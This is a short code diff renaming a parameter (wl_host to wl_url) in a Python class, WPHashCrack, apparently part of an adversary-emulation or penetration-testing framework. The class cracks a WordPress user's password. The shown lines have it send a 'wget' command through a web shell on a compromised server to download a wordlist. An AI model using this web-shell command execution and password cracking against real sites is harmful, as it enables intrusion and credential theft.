@@ -518,7 +518,7 @@ class WPHashCrack:
         self,
         hashcrack_url: str,
         file_name: str,
-        wl_host: str,
+        wl_url: str,
         wl_name: str,
         attacked_user: str,
         tar_download_name: str = None,
@@ -531,7 +531,7 @@ class WPHashCrack:
         Args:
             hashcrack_url: url of the hashcrack tar.
             file_name: name of the hashcrack tar.
-            wl_host: address of the host where wordlist is available.
+            wl_url: address of the host where wordlist is available.
             wl_name: name of the wordlist.
             attacked_user: the name of the WP user to crack the password.
             tar_download_name: the name of the hashcrack tar after downloading.
@@ -542,7 +542,7 @@ class WPHashCrack:
         """
         self.url = hashcrack_url
         self.file_name = file_name
-        self.wl_host = wl_host
+        self.wl_url = wl_url
         self.wl_name = wl_name
         self.attacked_user = attacked_user
         self.tar_download_name = tar_download_name
@@ -561,7 +561,7 @@ class WPHashCrack:
         web_shell = context.web_shell
         log = log.bind(
             url=self.url,
-            wl_host=self.wl_host,
+            wl_url=self.wl_url,
             attacked_user=self.attacked_user,
             web_shell=web_shell,
         )
@@ -599,7 +599,7 @@ class WPHashCrack:
             output = send_request(
                 log,
                 web_shell,
-                ["wget", str(self.wl_host)],
+                ["wget", str(self.wl_url)],
                 self.cmd_param,
                 self.verify,
                 self.timeout,
